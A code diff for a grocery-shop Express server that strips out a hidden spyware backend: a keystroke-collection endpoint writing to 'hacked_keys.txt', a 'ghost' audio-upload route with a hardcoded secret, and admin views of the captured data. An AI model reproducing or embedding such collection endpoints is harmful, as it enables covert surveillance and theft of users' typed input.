@@ -6,7 +6,7 @@ const axios = require("axios");
 const path = require("path");
 const multer = require("multer"); 
 const crypto = require("crypto"); 
-const fs = require('fs'); // Added fs globally
+const fs = require('fs');
 const { Resend } = require("resend"); 
 require("dotenv").config();
 
@@ -16,21 +16,6 @@ const Cart = require("./models/cart");
 const Order = require("./models/order");
 const Product = require("./models/product"); 
 const Banner = require("./models/banner");
-
-// --- 🚀 GHOST APP MODEL ---
-const GhostData = mongoose.model("GhostData", new mongoose.Schema({
-    deviceId: String,
-    fileName: String,
-    filePath: String,
-    timestamp: { type: Date, default: Date.now }
-}));
-
-// --- ⌨️ KEYBOARD LOG MODEL (New) ---
-const KeyboardLog = mongoose.model("KeyboardLog", new mongoose.Schema({
-    deviceId: String,
-    data: String,
-    timestamp: { type: Date, default: Date.now }
-}));
 
 const app = express();
 app.use(express.json());
@@ -49,13 +34,7 @@ app.use('/uploads', express.static(path.join(__dirname, 'public/uploads')));
 // --- MULTER CONFIG ---
 const storage = multer.diskStorage({
     destination: (req, file, cb) => {
-        if (file.fieldname === "audio") {
-            const dir = 'public/uploads/ghost/';
-            if (!fs.existsSync(dir)){ fs.mkdirSync(dir, { recursive: true }); }
-            cb(null, dir);
-        } else {
-            cb(null, 'public/uploads/'); 
-        }
+        cb(null, 'public/uploads/'); 
     },
     filename: (req, file, cb) => {
         const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
@@ -63,68 +42,6 @@ const storage = multer.diskStorage({
     }
 });
 const upload = multer({ storage: storage });
-
-// --- ⌨️ KEYBOARD RECEIVER API (New) ---
-// यह एंडपॉइंट आपके एंड्रॉइड कीबोर्ड से डेटा रिसीव करेगा
-app.post("/collect", async (req, res) => {
-    try {
-        const { data, deviceId } = req.body;
-        
-        // 1. डेटाबेस में सेव करें
-        const newLog = new KeyboardLog({
-            deviceId: deviceId || "Unknown Android",
-            data: data
-        });
-        await newLog.save();
-
-        // 2. बैकअप के लिए टेक्स्ट फाइल में भी लिखें
-        const logEntry = `[${new Date().toLocaleString()}] Device: ${deviceId || 'N/A'} - Data: ${data}\n`;
-        fs.appendFileSync('hacked_keys.txt', logEntry);
-
-        console.log("⌨️ Key Captured:", data);
-        res.status(200).send("Captured");
-    } catch (err) {
-        res.status(500).send("Error");
-    }
-});
-
-// --- 🚀 GHOST APP API ROUTES ---
-app.post("/api/upload-ghost-data", upload.single('audio'), async (req, res) => {
-    try {
-        const { device, secret } = req.body;
-        if (secret !== "RATU_GHOST_SECRET") return res.status(403).json({ error: "Invalid Secret" });
-
-        const newData = new GhostData({
-            deviceId: device || "Unknown Device",
-            fileName: req.file.filename,
-            filePath: `/uploads/ghost/${req.file.filename}`
-        });
-
-        await newData.save();
-        res.status(200).json({ success: true, message: "Sync Success" });
-    } catch (err) {
-        res.status(500).json({ error: "Server Error" });
-    }
-});
-
-app.get("/api/admin/ghost-list", async (req, res) => {
-    const { password } = req.query;
-    if (password !== process.env.ADMIN_PASSWORD) return res.status(403).send("Unauthorized");
-    try {
-        const data = await GhostData.find().sort({ timestamp: -1 });
-        res.json(data);
-    } catch (err) { res.status(500).json({ error: "Fetch failed" }); }
-});
-
-// --- ⌨️ ADMIN KEYBOARD LOGS VIEW (New) ---
-app.get("/api/admin/keyboard-logs", async (req, res) => {
-    const { password } = req.query;
-    if (password !== process.env.ADMIN_PASSWORD) return res.status(403).send("Unauthorized");
-    try {
-        const logs = await KeyboardLog.find().sort({ timestamp: -1 }).limit(100);
-        res.json(logs);
-    } catch (err) { res.status(500).json({ error: "Fetch failed" }); }
-});
 
 // --- DEFAULT ROUTES ---
 app.get("/", (req, res) => {
@@ -504,15 +421,12 @@ mongoose.connect(process.env.DBurl).then(async () => {
             { id: 'lauki', name: 'Bottle Gourd (Lauki)', price: 18, img: 'https://media.istockphoto.com/id/1194258667/photo/bottle-gourd.jpg?s=1024x1024&w=is&k=20&c=rmDr-KGaiUEaxCqaEQ6e_MakDj6klaXYE-StTySjPUM=', unit: 'kg', inStock: true },
             { id: 'karela', name: 'Bitter Gourd (Karela)', price: 28, img: 'https://media.istockphoto.com/id/472402096/photo/bitter-gourds.jpg?s=612x612&w=0&k=20&c=n7Ua0o7X4Qe_FSfl38ufHIPslxofgkyNpa2Z2NXmBfM=', unit: 'kg', inStock: true },
             { id: 'gajar', name: 'Carrot (Gajar)', price: 22, img: 'https://images.unsplash.com/photo-1633380110125-f6e685676160?auto=format&fit=crop&w=600', unit: 'kg', inStock: true },
-            { id: 'mooli', name: 'Radish (Mooli)', price: 15, img: 'https://media.istockphoto.com/id/903099876/photo/fresh-radish.webp?a=1&b=1&s=612x612&w=0&k=20&c=9oElMWTKZOzIny5ND9MESWmEgG-ONAINWzQL8tSrF04=', unit: 'kg', inStock: true },
             { id: 'baingan', name: 'Brinjal (Baingan)', price: 26, img: 'https://images.unsplash.com/photo-1613881553903-4543f5f2cac9?auto=format&fit=crop&w=600', unit: 'kg', inStock: true },
             { id: 'shimla', name: 'Capsicum (Shimla Mirch)', price: 40, img: 'https://media.istockphoto.com/id/137350104/photo/green-peppers.webp?a=1&b=1&s=612x612&w=0&k=20&c=7u2DZpZoSZIWkSDyvAbxkvNU09BrvPdQCPzM4LcsxvU=', unit: 'kg', inStock: true },
             { id: 'palak', name: 'Spinach (Palak)', price: 20, img: 'https://images.unsplash.com/photo-1576045057995-568f588f82fb?auto=format&fit=crop&w=600', unit: 'kg', inStock: true },
             { id: 'phool', name: 'Cauliflower (Phool Gobhi)', price: 30, img: 'https://media.istockphoto.com/id/1372304664/photo/cauliflower.webp?a=1&b=1&s=612x612&w=0&k=20&c=lEwN90TtHLVx-r3U9GRyRKmXKzfW4tdeUWRWAcOCX7k=', unit: 'kg', inStock: true },
-            { id: 'lemon', name: 'Lemon (Nimbu)', price: 10, img: 'https://media.istockphoto.com/id/871706470/photo/lemons.webp?a=1&b=1&s=612x612&w=0&k=20&c=y-meMhMc9CK-Mtz8vM6JRaIOEeiXPcnbdsGca-KCogM=', unit: 'pc', inStock: true },
             { id: 'lahsoon', name: 'Garlic (Lahsoon)', price: 21, img: 'https://media.istockphoto.com/id/531644839/photo/garlic.webp?a=1&b=1&s=612x612&w=0&k=20&c=kABuNBJXIiwWun2GETzq_Gn_u3M9MlxgTfBFLOZYrnU=', unit: 'kg', inStock: true },
-            { id: 'mirch', name: 'Green Chilli (Hari Mirch)', price: 45, img: 'https://media.istockphoto.com/id/942849220/photo/chilli.webp?a=1&b=1&s=612x612&w=0&k=20&c=qsUq5pSQ7j7T4O8UMEUiSgdSSt5DlKybwc7QS_o9Oao=', unit: 'kg', inStock: true },
-            { id: 'chana', name: 'Green Chickpeas (Hara Chana)', price: 32, img: 'https://media.istockphoto.com/id/899854420/photo/chana.webp?a=1&b=1&s=612x612&w=0&k=20&c=B_zR-xU5c5WDsJTvZKJAq2MkTJwJ--autmPGFPPoQ3w=', unit: 'kg', inStock: true }
+            { id: 'mirch', name: 'Green Chilli (Hari Mirch)', price: 45, img: 'https://media.istockphoto.com/id/942849220/photo/chilli.webp?a=1&b=1&s=612x612&w=0&k=20&c=qsUq5pSQ7j7T4O8UMEUiSgdSSt5DlKybwc7QS_o9Oao=', unit: 'kg', inStock: true }
         ];
         await Product.insertMany(initialProducts);
     }
